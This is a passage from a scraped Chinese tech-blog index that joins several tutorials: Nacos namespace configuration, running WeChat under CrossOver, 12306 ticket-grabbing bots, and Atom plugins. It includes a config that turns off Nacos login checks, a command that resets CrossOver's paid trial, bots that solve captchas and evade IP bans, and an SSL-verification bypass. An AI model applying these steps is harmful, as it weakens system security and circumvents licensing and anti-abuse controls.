命名空间可用于进行不同环境的配置隔离。例如可以隔离开发环境、测试环境和生产环境，因为它们的配置可能各不相同，或者是隔离不同的用户，不同的开发人员使用同一个 Nacos 管理各自的配置，可通过 Namespace 隔离。当在 Nacos 上创建一个配置时，如果未填写命名空间的名称，则命名空间的名称默认为 public。不同的命名空间下，可以存在相同名称的配置分组（Group） 或 配置集。 最佳实践 Nacos 抽象定义了 Namespace、Group、Data ID 的概念，具体这几个概念代表什么，取决于把它们看成什么，这里推荐一种用法，如下图： Namespace ：代表不同环境，如开发、测试、生产环境 Group：代表某项目，如 XX 医疗项目、XX 电商项目、XX 校园项目 DataId：每个项目下往往有若干个工程，每个配置集（DataId）是一个工程的主配置文件 Nacos 命名空间管理Namespace 隔离设计 Namespace 的设计是 Nacos 基于此做多环境以及多租户（多个用户共同使用 Nacos）数据（配置和服务）隔离的。从一个租户 (用户）的角度来看，如果有多套不同的环境，那么这个时候可以根据指定的环境来创建不同的 Namespace，以此来实现多环境的隔离。例如可能有开发、测试和生产三个不同的环境，那么使用一套 Nacos 集群可以分别建以下三个不同的 Namespace，如下图所示： 从多个租户（用户）的角度来看，每个租户（用户）可能会有自己的 Namespace，每个租户（用户）的配置数据以及注册的服务数据都会归属到自己的 Namespace 下，以此来实现多租户间的数据隔离。例如超级管理员分配了三个租户（用户），分别为张三、李四和王五。分配好了之后，各租户用自己的账户名和密码登录后，创建自己的命名空间。如下图所示： Nacos 创建命名空间 第一步：菜单栏选中命名空间，然后点击页面上的新建命名空间按钮 第二步：在表单内填写必要的命名空间信息，然后点击确定按钮提交 第三步：菜单栏选中配置管理 &gt; 配置列表，可以通过 Tab 按钮切换到不同的命名空间，接着就可以在对应的命名空间下新增配置信息 代码示例 12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba.nacos&lt;/groupId&gt; &lt;artifactId&gt;nacos-client&lt;/artifactId&gt; &lt;version&gt;1.4.0&lt;/version&gt;&lt;/dependency&gt; 12345678910111213141516171819202122232425import com.alibaba.nacos.api.NacosFactory;import com.alibaba.nacos.api.config.ConfigService;import com.alibaba.nacos.api.exception.NacosException;import java.util.Properties;/** * 从Nacos读取特定命名空间下的配置信息 * @author clay */public class NacosDemoApplicaton { public static void main(String[] args) throws NacosException { String serverAddr = "127.0.0.1:8848"; String namespace = "7ec71a71-6ee5-4f87-a387-0d29d9e8fe51"; String group = "DEFAULT_GROUP"; String dataId = "nacos_simple_demo.yaml"; Properties properties = new Properties(); properties.put("serverAddr", serverAddr); properties.put("namespace", namespace); ConfigService configService = NacosFactory.createConfigService(properties); String content = configService.getConfig(dataId, group, 1000); System.out.println(content); }} Nacos 常见配置管理操作配置集导出勾选若干配置集，点击导出选中的配置按钮，即可自动下载一个压缩包，压缩包内包含了选中配置集所转换的配置文件。 配置集导入点击右上角的导入配置按钮，选择之前导出的配置文件压缩包，可以将压缩包内的文件恢复为 Nacos 配置集。 配置集克隆勾选若干配置集，点击克隆按钮，可以将选中的配置集批量复制到指定的命名空间内。 历史版本Nacos 通过提供配置版本管理及其一键回滚能力，帮助用户改错配置的时候能够快速回滚，降低微服务系统在配置管理上的可用性风险。 监听查询Nacos 提供配置订阅者（即监听者）查询能力，同时提供客户端当前配置的 MD5 校验值，以便帮助用户更好的检查服务器的配置变更是否推送到 Nacos 客户端，其中 Nacos 客户端监听的示例代码如下： 123456789101112131415161718192021222324252627282930313233343536373839import com.alibaba.nacos.api.NacosFactory;import com.alibaba.nacos.api.config.ConfigService;import com.alibaba.nacos.api.config.listener.Listener;import com.alibaba.nacos.api.exception.NacosException;import java.io.IOException;import java.util.Properties;import java.util.concurrent.Executor;/** * Nacos客户端监听服务器的配置信息是否变更 * @author clay */public class NacosDemoApplicaton { public static void main(String[] args) throws NacosException, IOException { String serverAddr = "127.0.0.1:8848"; String group = "DEFAULT_GROUP"; String dataId = "nacos_simple_demo.yaml"; Properties properties = new Properties(); properties.put("serverAddr", serverAddr); ConfigService configService = NacosFactory.createConfigService(properties); String content = configService.getConfig(dataId, group, 1000); System.out.println(content); configService.addListener(dataId, group, new Listener() { @Override public Executor getExecutor() { return null; } @Override public void receiveConfigInfo(String configInfo) { System.out.println(configInfo); } }); System.in.read(); }} 登录管理Nacos 支持简单的登录功能，默认用户名 / 密码为： nacos/nacos， 生成密码 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework.security&lt;/groupId&gt; &lt;artifactId&gt;spring-security-core&lt;/artifactId&gt; &lt;version&gt;5.4.1&lt;/version&gt;&lt;/dependency&gt; 1234567891011/** * 由于采用BCrypt加密方法在每次生成密码时会加随机盐，因此生成的密码每次都可能不一样 * @author clay */public class PasswordEncoderUtil { public static void main(String[] args) { String password = new BCryptPasswordEncoder().encode("123456"); System.out.println(password); }} 创建登录用户 当 Nacos 使用 MySQL 数据库存储数据时，可以使用以下 SQL 来创建新用户，其中密码就是上面通过 Java 代码生成的字符串。同理，若需要更改旧用户的登录密码，只需要通过 SQL 更新对应的数据库表数据即可，这里不再累述。 12INSERT INTO users (username, password, enabled) VALUES (\'admin\',\'$2a$10$kCRcD31fYzYUhfvCSUqQ9u/IAKbq4yTWi1z3l6kTrKL5exGSNbSUK\', TRUE);INSERT INTO roles (username, role) VALUES (\'admin\', \'ROLE_ADMIN\'); 关闭登录功能由于部分公司自己开发控制台，不希望被 Nacos 的安全 Filter 拦截。因此 Nacos 支持定制关闭登录功能，只需要找到配置文件 ${nacos-home}/conf/application.properties，替换以下内容即可，最后重启 Nacos 服务使更改生效。特别注意，以下更改只适合 Nacos 1.2.0 以下的版本。 123456spring.security.enabled=falsemanagement.security=falsesecurity.basic.enabled=falsenacos.security.ignore.urls=/**# nacos.security.ignore.urls=/,/error,/**/*.css,/**/*.js,/**/*.html,/**/*.map,/**/*.svg,/**/*.png,/**/*.ico,/console-fe/public/**,/v1/auth/**,/v1/console/health/**,/actuator/**,/v1/console/server/** 下篇 - Nacos 入门教程 - 配置管理（中级篇） Nacos 入门教程 - 配置管理中级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"CrossOver 安装微信（WeChat）",url:"/posts/a1930361.html",text:'前言笔者曾在文章”CentOS 7 安装常用桌面软件 “中，推荐使用 electronic-wechat 作为 Linux 微信客户端，可惜在 CentOS 7 环境下的长期使用体验比较一般，例如接收到消息时无声音提示，且微信的托盘图标不会闪烁，同时由于 electronic-wechat 是在 Web 版微信的基础上开发的，这就导致新注册的微信账号登录受限，最终无法使用。经过一番尝试，发现 CrossOver 可以近乎完美地安装微信，而且运行的是微信官方原生的二进制执行文件。本教程适用于 Debian/Ubuntu/CentOS 系的 Linux 发行版，文章末尾附有微信运行的最终效果图。 软件版本说明 CrossOver： 19.0.0 微信 PC 客户端： 2.7.1.88 CrossOver 容器： WinXp-64-bit Linux 系统的输入法：搜狗输入法 For Linux 2.2.0.0108 CrossOver 安装运行微信遇到的坑CrossOver 安装微信的过程中可能遇到了以下问题，本文后面会详细一一给出对应的解决方法： 微信启动时偶尔崩溃 启动微信提示 WeChatWin.dll 文件缺失 微信的输入框无法显示光标与文字，只能复制黏贴 微信屏幕截图后，无法直接发送图片 微信的输入框无法使用搜狗输入法（Linux 版）输入中文 Linux 安装 CrossOverCrossOver 支持 Ubuntu、Mint、Debian 使用 deb 包安装，支持 Fedora、RHEL 使用 rpm 包安装，支持其他发行版（例如 CentOS）使用 bin 安装包安装。CrossOver 的安装比较简单，此处不再累述，可参考” 官方安装教程 “。推荐使用 root 用户进行安装，若安装过程中自定义了 CrossOver 的安装路径，则需要新增环境变量来指定 CrossOver 的安装路径，否则 CrossOver 部分命令将无法使用。 123456# 添加环境变量，指定CrossOver的自定义安装路径# vim /etc/profileexport CX_ROOT=/usr/local/cxoffice# 使配置生效# source /etc/profile CrossOver 安装微信从微信官网下载 PC 版的微信客户端后，可参考”CrossOver 如何安装未知应用程序 “里的步骤，在 CrossOver 上安装原生的微信 PC 客户端。 (adsbygoogle = window.adsbygoogle || []).push({}); 解决微信运行后出现的各种问题微信启动时偶尔崩溃微信需要运行在 CrossOver 的 WinXp-64-bit 容器中，否则微信启动时可能会崩溃。 微信屏幕截图后，无法直接发送图片微信屏幕截图，如果按” 钩” 确定截图完成，那么截图将则直接消失，不会将图片显示到输入框里，导致无法直接发送图片。建议截图完成后保存图片到本地，再从本地将图片拖拽到输入框里，这样就可以正常发送图片了。强烈推荐使用系统自带的截图工具或者第三方截图工具（例如 Shutter）替代微信的截图功能，因为可以将粘贴板里的图片直接粘贴到微信的输入框里。 启动微信提示 WeChatWin.dll 文件缺失原因是 Linux 系统缺少 lib32-libldap 依赖库，导致 CrossOver 无法加载特定的 dll 文件，安装上对应的依赖库后，重启微信客户端即可。 12345# 适用系统：Debian/Ubuntu/Mint# apt-get install -y libldap-2.4-2:i386# 适用系统：Fedora/RHEL/CentOS# yum install -y compat-openldap.i686 openldap.i686 openldap-devel.i686 compat-openldap.x86_64 openldap.x86_64 openldap-devel.x86_64 微信输入框无法显示光标与文字，只能复制黏贴下载 Windows 版的 riched20.dll 动态链接库（必须是这个版本），然后将下载得到的 riched20.dll 文件拷贝到 CrossOver 容器对应的 system32、syswow64（重点） 目录下，即覆盖掉 CrossOver 容器内的 riched20.dll 文件。例如当 CrossOver 容器的名称为 WinXp-64-bit，那么则需要将 Windows 版的 riched20.dll 拷贝到 ~/.cxoffice/WinXp-64-bit/drive_c/windows/system32 和 ~/.cxoffice/WinXp-64-bit/drive_c/windows/syswow64 目录下，拷贝完成后重启微信客户端。 微信输入框无法使用搜狗输入法（Linux 版）输入中文如果在 Linux 系统内，已经安装了 Linux 版的搜狗输入法，但无法在微信的输入框内输入中文，这可能是系统缺少了输入法的环境变量配置信息导致的。Crossover 的应用快捷方式文件默认存放在 ~/.local/share/applications/ 文件夹中，从中找到 xxx微信xxx.desktop 文件，然后在 desktop 文件中找到 lnk 文件的路径，最后使用编辑器添加相关配置信息到 lnk 文件中，完成后重启微信客户端。 123456789101112# 查看微信的应用快捷方式文件# cat ~/.local/share/applications/cxmenu-cxoffice-955d8f89-fd24-4c49-addb-5dc0e8a63a1e-2l9ih12-微信.desktop# 找到这行内容：Exec="/home/xxxx/.cxoffice/WinXp-64-bit/desktopdata/cxmenu/StartMenu.C^5E3A_ProgramData_Microsoft_Windows_Start^2BMenu/Programs/微信/微信.lnk" %u# 编辑lnk文件，在 #!/bin/sh 之后和 exec 之前添加以下环境变量配置# vim /home/xxxx/.cxoffice/WinXp-64-bit/desktopdata/cxmenu/StartMenu.C^5E3A_ProgramData_Microsoft_Windows_Start^2BMenu/Programs/微信/微信.lnkexport XIM=fcitxexport GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport QT4_IM_MODULE=fcitxexport XMODIFIERS="@im=fcitx" CrossOver 安装小小中文输入法若上面配置了输入法的环境变量，依然无法解决微信中文输入的问题，此时可将小小输入法安装到与微信同一 CrossOver 容器之下，安装后可以使用该输入法输入中文。值得一提的是，CrossOver 安装小小输入法的方法和上面 CrossOver 安装微信的方法是一样的，点击此处可从本站下载小小输入法（V2.5.0-0）的 EXE 安装文件。 小小中文输入法的安装注意事项 小小输入法安装完成后，不要勾选” 运行小小输入法”，直接点击” 完成” 按钮即可，否则 CrossOver 的安装程序会一直运行，除非点击菜单栏的托盘图标手动退出小小输入法 小小输入法安装完成后，容器不会出现小小输入法的启动快捷方式，即在应用程序列表中无法直接通过点击图标的方式来启动输入法，但可以参照以下方法手动创建小小输入法的启动快捷方式 由于在容器中的 c:/Program Files (x86)/yong/ 目录下已经有了安装后的文件夹，因此可以在容器中通过 "运行命令" 的功能，手动创建小小输入法的快捷方式或者输入命令 /home/xxxx/.cxoffice/WinXp-64-bit/dosdevices/c:/Program Files (x86)/yong/yong.exe 来直接运行小小输入法，其中创建小小输入法快捷方式的步骤如下图： 小小中文输入法的使用注意事项 通过 CrossOver 安装的程序使用小小输入法后与宿主机上安装的输入法是互不干扰的，两者都可以独立正常使用 小小输入法中英文切换的默认快捷键是左边的 Ctrl 键，支持自定义输入法的快捷键 小小输入法每次都需要手动启动，且首次使用需要通过小小输入法在菜单栏上的托盘图标切换到拼音输入法 若已经通过菜单栏的托盘图标切换到拼音输入法，但在微信输入框中依然无法输入中文，此时可以单击菜单栏上的托盘图标，直至右下角出现小小输入法的状态栏，然后再尝试输入中文 若上面的方法都无法使用小小输入法输入中文，此时试试重启输入法，然后再多试几次 建议先启动小小输入法，然后再启动微信应用 微信运行的最终效果图 常见问题微信版本升级若需要升级微信的版本，首先在官网下载最新版微信 PC 客户端的二进制执行文件，然后通过 UI 界面卸载 CrossOver 容器里的旧版微信，最后在容器里安装最新版的微信 PC 客户端即可。 CrossOver 试用期已过CrossOver 默认试用时间为 15 天，在 Linux 系统下，如果 15 天过后还想继续试用，可以执行以下操作进行破解。CrossOver 的试用时间验证信息是写在每一个 winebottle 容器中的（其本质就是在容器所在目录下创建文件了名称为 .eval 的隐藏文件 ），不同容器之间是完全隔离的（不是写在全局配置中）。即使一个已使用的容器过期了，依然可以创建新的容器，并重新计算试用期，所以不需要重装 CrossOver 软件。 12# 删除.eval文件$ rm ~/.cxoffice/容器名称/.eval 安装其他 Windows 原生应用在 Linux 环境下，若需要安装 QQ、TIM、迅雷、Office 等其他主流的 Windows 应用，可以参考上面 CrossOver 安装微信 PC 客户端的过程；因为安装步骤基本都是大同小异的，重点在于细节问题的解决。 Linux 安装微信的可选方案总结 腾讯官方 Web 版微信 Franz + 微信（基于 Web 版） Electronic-Wechat（基于 Web 版） 虚拟机 + 微信原生 PC 客户端 CrossOver + 微信原生 PC 客户端 Winetricks（基于 Wine） + 微信原生 PC 客户端 Winetricks-ZH（基于 Wine） + 微信原生 PC 客户端 AppImage + AppImage 打包构建的（Wine + 微信原生 PC 客户端） Flatpak + Flatpak 打包构建的（Deepin-Wine + 微信原生 PC 客户端） Wine + PlayonLinux + 微信原生 PC 客户端 参考博客 在 Ubuntu 中使用 TIM 和微信 Linux 下的 Wine 生活（QQ、微信、Office） Linux 上有什么好的 QQ 和微信登陆解决方案 优麒麟 16.04 安装 CrossOver，QQ 输入不了中文 在 CrossOver 容器安装小小输入法解决无法输入中文的问题 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux"},{title:"12306 抢票软件的安装与使用",url:"/posts/8980c415.html",text:'前言 本教程主要介绍如何通过 Docker 安装和使用 TesterSunshine/12306 抢票软件，并配合使用本地的打码服务。 TesterSunshine/12306 抢票软件的功能 自动打码 自动登录 准点预售和捡漏 智能候补 邮件通知 Server 酱通知 Docker 和 Docker-Compose 安装 依赖 Docker 版本为 18.09 及以上，Docker-Compose 版本为 1.23.2 及以上，具体安装步骤可参考站内以下教程： Docker 安装教程 Docker-Compose 安装教程 TesterSunshine/12306 抢票软件安装 12345678910111213141516171819202122232425262728293031# 拉取源码# git clone https://github.com/testerSunshine/12306.git# 进入源码的根目录# cd 12306# 修改配置文件里的账号、出发城市、到达城市、抢票通知等信息（原配置文件里有详细的配置介绍，根据注释提示进行配置即可），若使用使用本地的打码服务，必须修改AUTO_CODE_TYPE为3，HOST改为"captcha:80"# vim TickerConfig.py# 拉取打码服务的Docker镜像# docker-compose pull captcha# 构建抢票服务的Docker镜像# docker-compose build ticket# 提示：若拉取或者构建Docker镜像耗时过长（网络下载慢），此时建议配置Docker使用代理或者更换Docker的镜像源# 创建并启动打码服务和抢票服务的Docker容器（命令执行成功后会自动开始抢票）# docker-compose up -d# 查看容器的状态# docker-compose ps# 查看抢票服务的日志信息# docker logs --follow ticket 或者 docker logs --follow ticket --tail 10# 停止抢票# docker-compose stop# 开始抢票# docker-compose start 当 TickerConfig.py 配置文件被更改后，需要重新构建抢票服务的 Docker 镜像，否则配置文件的更改不会生效，此时可执行以下步骤： 1234567891011# 进入源码的根目录# cd 12306# 关闭并销毁容器# docker-compose down# 重新构建抢票服务的Docker镜像# docker-compose build ticket# 创建并启动打码服务和抢票服务的Docker容器（执行成功后会自动开始抢票）# docker-compose up -d 抢票成功的日志信息 123456789101112131415正在第355次查询 乘车日期: 2018-02-12 车次G4741,G2365,G1371,G1377,G1329 查询无票 代理设置 无 总耗时429ms车次: G4741 始发车站: 上海 终点站: 邵阳 二等座:有正在尝试提交订票...尝试提交订单...出票成功排队成功, 当前余票还剩余: 359 张正在使用自动识别验证码功能验证码通过,正在提交订单提交订单成功！排队等待时间预计还剩 -12 ms排队等待时间预计还剩 -6 ms排队等待时间预计还剩 -7 ms排队等待时间预计还剩 -4 ms排队等待时间预计还剩 -4 ms恭喜您订票成功，订单号为：EB52743573, 请立即打开浏览器登录12306，访问‘未完成订单’，在30分钟内完成支付！ 关于 IP 被屏蔽 若出现下载验证码过期或者下载验证码失败的问题，此时应该是触发了 12306 封 IP 的策略，建议多重试几次。12306 现在封服务器（阿里云和腾讯云）IP 比较严重，尽量不要在服务器环境下运行。 最后更新 2020 年春节前后，使用该抢票程序成功帮朋友抢到 7 张高铁票，运行环境是单台 Vultr 低配服务器（国外）和家用 PC 机（国内） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux"},{title:"一款带 Web 管理界面的 12306 抢票软件",url:"/posts/94aa8dbb.html",text:'前言 本文主要介绍 Py12306 抢票软件的手动安装和 Docker 安装过程，适用于 Centos/Debian/Ubuntu，目前主流开源的 12306 抢票软件有：testerSunshine/12306、pjialin/py12306。 Py12306 抢票功能介绍 多日期查询余票 自动打码下单 用户状态恢复 电话语音通知 多账号、多任务、多线程支持 单个任务多站点查询 分布式运行 Docker 支持 动态修改配置文件 邮件通知 Web 管理页面 微信消息通知 代理池支持 (pyproxy-async) Python3.6 安装 Py12306 需要运行在 Python 3.6 以上版本。 12345678910111213141516171819202122232425262728293031323334# 安装依赖（Ubuntu），由于Ubuntu16+自带Python3，只需要安装pip3即可，无需再执行下面通过源码编译安装Python3的操作# apt install -y python3-pip# 安装依赖（Debian）# apt-get update -y# apt-get install -y build-essential tk-dev libncurses5-dev libncursesw5-dev libreadline6-dev libdb5.3-dev libgdbm-dev libsqlite3-dev libssl-dev libbz2-dev libexpat1-dev liblzma-dev zlib1g-dev# 安装依赖（Centos）# yum groupinstall -y "Development tools"# yum install -y sqlite-devel ncurses-devel ncurses-libs zlib-devel mysql-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel openssl-devel bzip2-devel expat-devel# 下载Python3.6.5源码# wget https://www.python.org/ftp/python/3.6.5/Python-3.6.5.tgz# 解压源码# tar -xvf Python-3.6.5.tgz# 进入解压后的目录# cd Python-3.6.5# 预配置，并指定安装路径# ./configure --prefix=/usr/local/python3.6.5# 编译安装# make# make install# 创建软链接# ln -s /usr/local/python3.6.5/bin/pip3.6 /usr/bin/pip3.6# ln -s /usr/local/python3.6.5/bin/python3.6 /usr/bin/python3.6# 删除文件和目录# rm -rf Python-3.6.5# rm -f Python-3.6.5.tgz 手动安装 Py12306 123456789101112131415161718192021222324252627282930313233# 克隆源码# git clone https://github.com/pjialin/py12306# 进入源码目录# cd py12306# 安装依赖# pip3.6 install -r requirements.txt# 拷贝配置文件# cp env.py.example env.py# 更改配置文件内容（原配置文件里有详细的配置介绍，根据注释提示进行配置即可）# vim env.py# 启动前测试（包括用户账号检测，乘客信息检测，车站检测）# python3.6 main.py -t# 默认不会进行通知测试，如果要对通知进行测试需要加上 -n 参数，其他参数包括 -c 指定自定义配置文件位置# python3.6 main.py -t -n# 前台运行程序# python3.6 main.py# 后台运行程序（建议修改配置文件，开启日志文件的记录，日志文件默认路径是：runtime/12306.log）# nohup python3.6 main.py &amp;# 后台运行程序的情况下，查看日志文件（前提是已开启日志文件的记录）# tail -f runtime/12306.log# 应用成功运行后，本地浏览器访问http://localhost:8008，即可打开Web管理界面，如需外网访问Web管理界面，需要打开防火墙端口8008# firewall-cmd --zone=public --add-port=8008/tcp --permanent# firewall-cmd --reload (adsbygoogle = window.adsbygoogle || []).push({}); Docker 安装 Py12306 123456789101112131415161718192021222324252627# 新建文件夹存放配置文件# mkdir py12306# 进入新建的文件夹# cd py12306# 创建数据目录# mkdir data# 下载配置文件# docker run --rm pjialin/py12306 cat /config/env.py &gt; env.py# 或者# curl https://github.com/pjialin/py12306/blob/master/env.docker.py.example -o env.py# 更改配置文件内容（原配置文件里有详细的配置介绍，根据注释提示进行配置即可）# vim env.py# 启动容器（该命令必须在py12306文件夹内执行）# docker run -d --name py12306 -p 8008:8008 -v $(pwd):/config -v data:/data pjialin/py12306# 容器成功启动后，当前目录下会多了一个12306.log日志文件# tail -f 12306.log# 本地浏览器访问http://localhost:8008，即可打开Web管理界面，如需外网访问Web管理界面，需要打开防火墙端口8008# firewall-cmd --zone=public --add-port=8008/tcp --permanent# firewall-cmd --reload Docker-Compose 中使用 Py12306 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# 新建文件夹存放配置文件# mkdir /usr/local/py12306# 进入新建的文件夹# cd /usr/local/py12306# 下载py12306配置文件# docker run --rm pjialin/py12306 cat /config/env.py &gt; env.py# 或者# curl https://github.com/pjialin/py12306/blob/master/env.docker.py.example -o env.py# 更改py12306配置文件的内容（原配置文件里有详细的配置介绍，根据注释提示进行配置即可）# vim env.py# 创建docker-compose配置文件# touch docker-compose.yml# 新增以下内容到docker-compose配置文件中# vim docker-compose.ymlversion: "3.5"services: redis: image: pjialin/py12306 container_name: py12306 restart: always privileged: false ports: - 8008:8008 volumes: - \'/usr/local/py12306:/config\' - \'/usr/local/py12306/env.py:/config/env.py\' - \'/usr/local/py12306/runtime:/code/runtime\'# 启动容器（必须在docker-compose.yml配置文件所在的目录下执行）# docker-compose up -d# 容器成功启动后的目录结构如下# tree /usr/local/py12306├── docker-compose.yml├── 12306.log├── env.py├── query│&nbsp;&nbsp; └── status.json├── runtime└── user └── xxxxxxx.cookie# 防火墙端口的开放和Web管理界面的访问，可参考上面的介绍 关于 IP 被屏蔽 目前查询和登录操作是分开的，查询是不依赖用户是否登录。12306 现在封服务器（阿里云和腾讯云）IP 比较严重，尽量不要在服务器环境下运行。关于分布式集群和代理池的支持，有兴趣的可以访问 Github 进一步学习。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux"},{title:"人工智能入门介绍",url:"/posts/d571deaa.html",text:'预备能力 英语能力 基础数学能力 熟悉一门编程语言 熟悉深度学习框架 6 级或托福 75 分 大学期间曾学习过单元微积分、多元微积分、线性代数、概率论 C、C++、Java、Python、MATLAB Tensorflow、Pytorch 人工智能三大方向 自然语言处理（NLP） 计算机视觉（CV） 推荐系统、计算广告 简介 主要用于解决文本自动分类、文本重要信息自动提取、数据挖掘、文本自动生成、对话机器人、知识图谱等领域，用以解决人类对文本信息分析与理解的自动化 主要用于解决人类对图形、图像、视频等信息的自动化处理，例如图像智能处理与识别、视频检测、图像自动生成、无人驾驶、人脸识别与检测等 主要用于解决从大量数据中获取有效数据，例如电影、图书推荐，异常信息挖掘，重要群落发现，关系网络计算等 技术 涉及经典人工智能方法、机器学习、深度学习方法 涉及计算机视觉的深度学习方法，并包括集计算机图形学、经典计算机视觉中的重点方法，同时也覆盖了基于对抗生成网络（GAN）的图像生成方法 涉及经典的机器学习、深度学习、以及推荐系统、广告预测、反欺诈识别、智能设计、分布式和大数据处理 主流机器学习框架 国内外三大主流机器学习框架分别是 Tensorflow、PyTorch、PaddlePaddle，其他框架还有 SINGA、MXNet、Keras、Horovod。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"ai"},{title:"Atom 插件管理",url:"/posts/b2a15380.html",text:'Atom 解决在线安装或更新插件慢的问题 1234567891011121314# 方法一（配置代理，推荐使用）# 配置Atom代理$ vim ~/.atom/.apmrcstrict-ssl=falseproxy=http://127.0.0.1:8118http-proxy=http://127.0.0.1:8118https-proxy=http://127.0.0.1:8118# 检查安装环境$ apm install --check# 更新插件，并查看使用代理后，APM发出的更新请求是否都经过了代理$ apm update --verbose 1234567891011121314151617# 方法二（配置仓库源，由于APM的依赖很多并不是NPM的，因此即使使用了淘宝的NPM源也不一定能解决下载慢的问题）# 配置APM的仓库源$ vim ~/.atom/.apmrcregistry=https://registry.npm.taobao.org/# 配置NPM的仓库源$ npm -config set registry https://registry.npm.taobao.org# 检查APM的安装环境$ apm install --check# 查看APM的配置$ apm config list# 更新插件$ apm update --verbose Atom 离线安装插件 12345678910111213# 进入Atom插件所在的本地目录$ cd ~/.atom/packages# 在Atom的插件官网（https://atom.io/packages）上搜索插件，获取对应插件的代码仓库Git地址，并将源代码克隆下来$ git clone https://github.com/platformio/platformio-atom-ide-terminal# 进入插件的源码目录$ cd platformio-atom-ide-terminal# 执行NPM安装操作$ npm install# 重启Atom编辑器 Atom 插件管理 1234567891011# 查看所有已安装的插件（包括官方插件和社区插件）$ apm list# 查看Atom仓库中某个插件的版本信息$ apm show termination# 安装某个插件$ apm install termination# 卸载某个插件$ apm uninstall termination Atom 的 Markdown 插件 123456789101112131415161718192021222324252627# PDF预览$ apm install pdf-view# Markdown编写优化$ apm install markdown-writer# Markdown代码着色，提供代码片段生成$ apm install language-markdown# 将剪贴面板中的图片复制到本地文件夹$ apm install markdown-image-paste# Markdown预览滚动同步$ apm install markdown-scroll-sync# Markdown表格插入$ apm install markdown-table-editor# Markdown导出PDF$ apm install markdown-themeable-pdf# Markdown预览（方案一）$ apm install markdown-preview-plus# Markdown预览（方案二），推荐使用$ apm install language-gfm-enhanced$ apm install markdown-preview-enhanced Atom 的 Markdown 图床插件 Atom 编写 Markdown 文件，通过插件将图片上传到七牛图床，可参考本站教程 1234567891011121314# 将剪贴面板中的图片上传到指定的图床，需要额外安装针对图床的上传插件$ apm install markdown-assistant# 阿里云图床上传插件，支持 markdown-assistant$ apm install oss-uploader# 微博图床上传插件，支持 markdown-assistant$ apm installweibo-uploader# 青云图床上传插件，支持 markdown-assistant$ apm install qcloud-uploader# 七牛图床（对象存储）上传插件，支持 markdown-assistant$ apm install qiniu-uploader Atom 的 Git 插件 1234567891011121314# 图形化Git提交记录$ apm install git-log# 通过Ctrl+Shift+P执行Git命令$ apm install git-plus# 适用于Git的图形化操作面板$ apm install git-control# 适用于Git的合并工具$ apm install merge-conflicts#显示文件夹的Git状态$ apm install tree-view-git-status Atom 其他常用插件 1234567891011121314# 图标美化$ apm install file-icons# 适用于Atom的配置备份与同步$ apm install sync-settings# 在当前目录打开系统原生的终端控制台$ apm install open-terminal-here# 终端控制台（方案一），推荐使用$ apm install termination# 终端控制台（方案二）$ apm install platformio-ide-terminal markdown-image-paste 插件的配置示例 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"Linux 安装 Atom 编辑器",url:"/posts/90c5573a.html",text:'最新公告 截止 2021 年 10 月 22 日，由于 Atom 